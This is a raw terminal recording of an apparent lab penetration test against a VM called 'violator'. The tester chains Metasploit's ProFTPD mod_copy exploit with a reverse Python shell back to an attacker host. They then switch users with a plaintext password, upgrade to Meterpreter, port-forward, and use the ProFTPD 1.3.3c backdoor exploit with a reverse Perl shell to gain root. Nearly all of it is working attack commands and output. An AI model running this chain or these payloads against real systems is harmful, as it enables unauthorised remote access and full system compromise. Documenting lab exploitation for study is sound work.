Script started on 2020-09-27 09:54:24-03:00 [TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="166" LINES="33"]
]0;root@Pentest: /home/joaofracassi/beco-xpl/violator[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/violator[00m# msfconsole
[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../                                                  
[0m[36m[0m[31m               .;lxO0KXXXK0Oxl:.
           ,o0WMMMMMMMMMMMMMMMMMMKd,
        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
 oMMMMMMMMMMx.                    dMMMMMMMMMMx
.WMMMMMMMMM:                       :MMMMMMMMMM,
xMMMMMMMMMo                         lMMMMMMMMMO
NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
xMMMMMMMMMd                        ,0MMMMMMMMMMK;
.WMMMMMMMMMc                         'OMMMMMM0,
 lMMMMMMMMMMk.                         .kMMO'
  dMMMMMMMMMMWd'                         ..
   cWMMMMMMMMMMMNxc'.[0m[37m                ##########[0m
[31m    .0MMMMMMMMMMMMMMMMWc[0m[37m            #+#    #+#[0m
[31m      ;0MMMMMMMMMMMMMMMo.[0m[37m          +:+[0m
[31m        .dNMMMMMMMMMMMMo[0m          +[37m#+[0m+:++#+
[31m           'oOWMMMMMMMMo[0m                +:+
[31m               .,cdkO0K;[0m        :+:    :+:                                
                                :::::::+:
                      [37mMetasploit[0m[0m

       =[ [33mmetasploit v5.0.101-dev[0m                         ]
+ -- --=[ 2049 exploits - 1108 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Adapter names can be used for IP params [32mset LHOST eth0[0m

[?1034h[4mmsf5[0m [0m> clear
[0m[1m[34m[*][0m exec: clear

[H[2J[3J[4mmsf5[0m [0m> ss[Kearch md[Kodprobe[K[K[K[K[Kcopy
[0m
Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/unix/ftp/proftpd_[45mmodcopy[0m_exec  2015-04-22       [32mexcellent[0m  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution


[4mmsf5[0m [0m> use exploit/unix/ftp/proftpd_modcopy_exec
[0m[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> options
[0m
Module options (exploit/unix/ftp/proftpd_modcopy_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       HTTP port (TCP)
   RPORT_FTP  21               yes       FTP port
   SITEPATH   /var/www         yes       Absolute writable website path
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path to the website
   TMPPATH    /tmp             yes       Absolute writable path
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   ProFTPD 1.3.5


[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> set rhosts 192.168.1.107
[0mrhosts => 192.168.1.107
[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> setpath[K[K[K[K sitepah[Kth /var/www/html
[0msitepath => /var/www/html
[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> optyion[K[K[K[Kion
[0m[1m[31m[-][0m Unknown command: option.
[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> opyion[K[K[K[Ktions
[0m
Module options (exploit/unix/ftp/proftpd_modcopy_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.1.107    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       HTTP port (TCP)
   RPORT_FTP  21               yes       FTP port
   SITEPATH   /var/www/html    yes       Absolute writable website path
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path to the website
   TMPPATH    /tmp             yes       Absolute writable path
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   ProFTPD 1.3.5


[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> set payload cmd/unix/resever[K[K[K[K[Kverse_python
[0mpayload => cmd/unix/reverse_python
[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> options
[0m
Module options (exploit/unix/ftp/proftpd_modcopy_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.1.107    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       HTTP port (TCP)
   RPORT_FTP  21               yes       FTP port
   SITEPATH   /var/www/html    yes       Absolute writable website path
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path to the website
   TMPPATH    /tmp             yes       Absolute writable path
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_python):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
   SHELL  /bin/bash        yes       The system shell to use.


Exploit target:

   Id  Name
   --  ----
   0   ProFTPD 1.3.5


[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> set lhost 192.168.1.105
[0mlhost => 192.168.1.105
[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> set lport 443
[0mlport => 443
[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> options
[0m
Module options (exploit/unix/ftp/proftpd_modcopy_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.1.107    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       HTTP port (TCP)
   RPORT_FTP  21               yes       FTP port
   SITEPATH   /var/www/html    yes       Absolute writable website path
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path to the website
   TMPPATH    /tmp             yes       Absolute writable path
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_python):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.105    yes       The listen address (an interface may be specified)
   LPORT  443              yes       The listen port
   SHELL  /bin/bash        yes       The system shell to use.


Exploit target:

   Id  Name
   --  ----
   0   ProFTPD 1.3.5


[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> cle[K[K[Kexploit
[0m
[1m[34m[*][0m Started reverse TCP handler on 192.168.1.105:443 
[1m[34m[*][0m 192.168.1.107:80 - 192.168.1.107:21 - Connected to FTP server
[1m[34m[*][0m 192.168.1.107:80 - 192.168.1.107:21 - Sending copy commands to FTP server
[1m[34m[*][0m 192.168.1.107:80 - Executing PHP payload /xpga6rQ.php
[1m[34m[*][0m Command shell session 1 opened (192.168.1.105:443 -> 192.168.1.107:37183) at 2020-09-27 09:59:58 -0300

[0mid
uid=33(www-data) gid=33(www-data) groups=33(www-data)

python -c " 'import pty;pty.spw awn("/bin/bash")'
www-data@violator:/var/www/html$ 

www-data@violator:/var/www/html$ ls  su dg       g  
su dg
Password: policyoftruth

dg@violator:/var/www/html$ wha oami
whoami
dg
dg@violator:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for dg on violator:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dg may run the following commands on violator:
    (ALL) NOPASSWD: /home/dg/bd/sbin/proftpd
dg@violator:/var/www/html$ 

dg@violator:/var/www/html$ 

dg@violator:/var/www/html$ 

dg@violator:/var/www/html$ cd /bo 	   home/bd  dg/bd
cd /home/dg/bd
dg@violator:~/bd$ ls
ls
[0m[01;34mbin[0m  [01;34metc[0m  [01;34minclude[0m  [01;34mlib[0m  [01;34mlibexec[0m  [01;34msbin[0m  [01;34mshare[0m  [01;34mvar[0m
dg@violator:~/bd$ cd /etc/     et	x x c
cd etc
dg@violator:~/bd/etc$ ls
ls
proftpd.conf
dg@violator:~/bd/etc$ cat proftpd.conf
cat proftpd.conf
# This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName			"Depeche Mode Violator Server"
ServerType			standalone
DefaultServer			on

# Belt up son!
SocketBindTight			on

# Port 21 is the standard FTP port.
Port				2121

# Listen onnly on lo
DefaultAddress			127.0.0.1

# Don't use IPv6 support by default.
UseIPv6				off

# Umask 022 is a good standard umask to prevent new dirs and files
# from being group and world writable.
Umask				022

# To prevent DoS attacks, set the maximum number of child processes
# to 30.  If you need to allow more than 30 concurrent connections
# at once, simply increase this value.  Note that this ONLY works
# in standalone mode, in inetd mode you should use an inetd server
# that allows you to limit maximum number of processes per service
# (such as xinetd).
MaxInstances			30

# Set the user and group under which the server will run.
User				nobody
Group				nogroup

# To cause every FTP user to be "jailed" (chrooted) into their home
# directory, uncomment this line.
#DefaultRoot ~

# Normally, we want files to be overwriteable.
AllowOverwrite		on

# Bar use of SITE CHMOD by default
<Limit SITE_CHMOD>
  DenyAll
</Limit>

# A basic anonymous configuration, no upload directories.  If you do not
# want anonymous users, simply delete this entire <Anonymous> section.
<Anonymous ~ftp>
  User				ftp
  Group				ftp

  # We want clients to be able to login with "anonymous" as well as "ftp"
  UserAlias			anonymous ftp

  # Limit the maximum number of anonymous logins
  MaxClients			10

  # We want 'welcome.msg' displayed at login, and '.message' displayed
  # in each newly chdired directory.
  DisplayLogin			welcome.msg
  DisplayChdir			.message

  # Limit WRITE everywhere in the anonymous chroot
  <Limit WRITE>
    DenyAll
  </Limit>
</Anonymous>
dg@violator:~/bd/etc$ netstat -antp
netstat -antp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 192.168.1.107:37183     192.168.1.105:443       ESTABLISHED 1166/bash       
tcp6       0      0 :::21                   :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
dg@violator:~/bd/etc$ 

dg@violator:~/bd/etc$ netcat     stat -nlpt
netstat -nlpt
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp6       0      0 :::21                   :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
dg@violator:~/bd/etc$  
 
dg@violator:~/bd/etc$ ]
]
]: command not found
dg@violator:~/bd/etc$ n sudo   -l
sudo -l
Matching Defaults entries for dg on violator:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dg may run the following commands on violator:
    (ALL) NOPASSWD: /home/dg/bd/sbin/proftpd
dg@violator:~/bd/etc$ 

dg@violator:~/bd/etc$ 

dg@violator:~/bd/etc$ sudo home/dg/bd/sbin/proftpd
sudo home/dg/bd/sbin/proftpd
[sudo] password for dg: policyoftruth

sudo: home/dg/bd/sbin/proftpd: command not found
dg@violator:~/bd/etc$ ^[[A^[[A        

dg@violator:~/bd/etc$ sudo /home/dg/db/sbin/proftpd
sudo /home/dg/db/sbin/proftpd
[sudo] password for dg: policyoftruth

sudo: /home/dg/db/sbin/proftpd: command not found
dg@violator:~/bd/etc$ 

dg@violator:~/bd/etc$ 

dg@violator:~/bd/etc$ sudo /home/dg/bd/sbin/proftpd
sudo /home/dg/bd/sbin/proftpd
 - setting default address to 127.0.0.1
localhost - SocketBindTight in effect, ignoring DefaultServer
dg@violator:~/bd/etc$ 

dg@violator:~/bd/etc$ netstat -anpt
netstat -anpt
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:2121          0.0.0.0:*               LISTEN      -               
tcp        0      0 192.168.1.107:37183     192.168.1.105:443       ESTABLISHED 1166/bash       
tcp6       0      0 :::21                   :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
dg@violator:~/bd/etc$ ^Z
Background session 1? [y/N]  y
[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> 
[0m[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> 
[0m[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> ss[K[Ksessions
[0m
Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.168.1.105:443 -> 192.168.1.107:37183 (192.168.1.107)

[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> seae[Krxh [K[K[K[Ke[Krxh[K[Kxh[K[Kch shell_to_meterpreter
[0m
Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/[45mshell_to_meterpreter[0m                   normal  No     Shell to Meterpreter Upgrade


[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> use [P e [C p o s t / m u l t i / m a n a g e / s h e l l _ t o _ m e t e r p r e t e r 
[0m[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> set [K[K[K[Koptions
[0m
Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.

[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> set lhpost[K[K[K[Kost 192.168.1.105
[0mlhost => 192.168.1.105
[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> options
[0m
Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST    192.168.1.105    no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.

[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> set session 1
[0msession => 1
[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> options
[0m
Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST    192.168.1.105    no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION  1                yes       The session to run this module on.

[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> run
[0m
[1m[34m[*][0m Upgrading session ID: 1
[1m[34m[*][0m Starting exploit/multi/handler
[1m[34m[*][0m Started reverse TCP handler on 192.168.1.105:4433 
[1m[34m[*][0m Sending stage (980808 bytes) to 192.168.1.107
[1m[34m[*][0m Meterpreter session 2 opened (192.168.1.105:4433 -> 192.168.1.107:41501) at 2020-09-27 10:17:07 -0300
[0m[1m[34m[*][0m Command stager progress: 100.00% (773/773 bytes)
[1m[34m[*][0m Post module execution completed
[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> sessions
[0m
Active sessions
===============

  Id  Name  Type                   Information                                                                       Connection
  --  ----  ----                   -----------                                                                       ----------
  1         shell cmd/unix                                                                                           192.168.1.105:443 -> 192.168.1.107:37183 (192.168.1.107)
  2         meterpreter x86/linux  no-user @ violator (uid=1000, gid=1000, euid=1000, egid=1000) @ violator.exam...  192.168.1.105:4433 -> 192.168.1.107:41501 (192.168.1.107)

[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> sessions 2
[0m[1m[34m[*][0m Starting interaction with 2...

[4mmeterpreter[0m > portfwd[Kd --help
[0mUsage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -R        Indicates a reverse port forward.
    -h        Help banner.
    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.
[4mmeterpreter[0m > 
[0m[4mmeterpreter[0m > 
[0m[4mmeterpreter[0m > portfwd add -L 12700[K[K[K7.0.0.1 -l 2121 -p 211[K21 -r 127.0.0.1
[0m[1m[34m[*][0m Local TCP relay created: 127.0.0.1:2121 <-> 127.0.0.1:2121
[4mmeterpreter[0m > 
Background session 2? [y/N]  
[0m[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> 
[0m[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> sessions
[0m
Active sessions
===============

  Id  Name  Type                   Information                                                                       Connection
  --  ----  ----                   -----------                                                                       ----------
  1         shell cmd/unix                                                                                           192.168.1.105:443 -> 192.168.1.107:37183 (192.168.1.107)
  2         meterpreter x86/linux  no-user @ violator (uid=1000, gid=1000, euid=1000, egid=1000) @ violator.exam...  192.168.1.105:4433 -> 192.168.1.107:41501 (192.168.1.107)

[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> search 1[K133c
[0m
Matching Modules
================

   #  Name                                    Disclosure Date  Rank       Check  Description
   -  ----                                    ---------------  ----       -----  -----------
   0  exploit/unix/ftp/proftpd_[45m133c[0m_backdoor  2010-12-02       [32mexcellent[0m  No     ProFTPD-1.3.3c Backdoor Command Execution


[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> use exploit/unix/ftp/proftpd_133c_backdoor
[0m[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> options
[0m
Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> set payload /[K[K[K[K[K[K[K[K[K[K[K[K[Kset rhosts [K 127.0.0.1
[0mrhosts => 127.0.0.1
[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> set rport 2121
[0mrport => 2121
[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> options
[0m
Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  127.0.0.1        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   2121             yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> set payload cmd/unix/RESER[K[K[K[K[Kreser[K[K[Kverse_perl
[0mpayload => cmd/unix/reverse_perl
[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> options
[0m
Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  127.0.0.1        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   2121             yes       The target port (TCP)


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> set lhost 192.168.1.105
[0mlhost => 192.168.1.105
[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> set lport 8080
[0mlport => 8080
[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> option
[0m[1m[31m[-][0m Unknown command: option.
[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> options
[0m
Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  127.0.0.1        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   2121             yes       The target port (TCP)


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.105    yes       The listen address (an interface may be specified)
   LPORT  8080             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> exploit
[0m
[1m[34m[*][0m Started reverse TCP handler on 192.168.1.105:8080 
[1m[34m[*][0m 127.0.0.1:2121 - Sending Backdoor Command
[1m[34m[*][0m Exploit completed, but no session was created.
[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> sessions
[0m
Active sessions
===============

  Id  Name  Type                   Information                                                                       Connection
  --  ----  ----                   -----------                                                                       ----------
  1         shell cmd/unix                                                                                           192.168.1.105:443 -> 192.168.1.107:37183 (192.168.1.107)
  2         meterpreter x86/linux  no-user @ violator (uid=1000, gid=1000, euid=1000, egid=1000) @ violator.exam...  192.168.1.105:4433 -> 192.168.1.107:41501 (192.168.1.107)

[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> sessions[Pexploit
[0m
[1m[34m[*][0m Started reverse TCP handler on 192.168.1.105:8080 
[1m[34m[*][0m 127.0.0.1:2121 - Sending Backdoor Command
[1m[34m[*][0m Exploit completed, but no session was created.
[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> run
[0m
[1m[34m[*][0m Started reverse TCP handler on 192.168.1.105:8080 
[1m[34m[*][0m 127.0.0.1:2121 - Sending Backdoor Command
[1m[34m[*][0m Exploit completed, but no session was created.
[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> set [K[K[K[Koptions
[0m
Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  127.0.0.1        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   2121             yes       The target port (TCP)


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.105    yes       The listen address (an interface may be specified)
   LPORT  8080             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> set lport 443
[0mlport => 443
[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> rn[K[Koptions
[0m
Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  127.0.0.1        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   2121             yes       The target port (TCP)


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.105    yes       The listen address (an interface may be specified)
   LPORT  443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> run
[0m
[1m[34m[*][0m Started reverse TCP handler on 192.168.1.105:443 
[1m[34m[*][0m 127.0.0.1:2121 - Sending Backdoor Command
[1m[34m[*][0m Command shell session 3 opened (192.168.1.105:443 -> 192.168.1.107:37189) at 2020-09-27 10:34:06 -0300

[0mid
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)

whaom   oami
root

] cd /root
ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz

exit
^C
Abort session 3? [y/N]  u y

[1m[34m[*][0m 127.0.0.1 - Command shell session 3 closed.  Reason: User exit
[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> 
[0m[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> exit
[0m[1m[34m[*][0m You have active sessions open, to exit anyway type "exit -y"
[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> e[Kexity -y
[0m[1m[31m[-][0m Unknown command: exity.
[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> exit
[0m[1m[34m[*][0m You have active sessions open, to exit anyway type "exit -y"
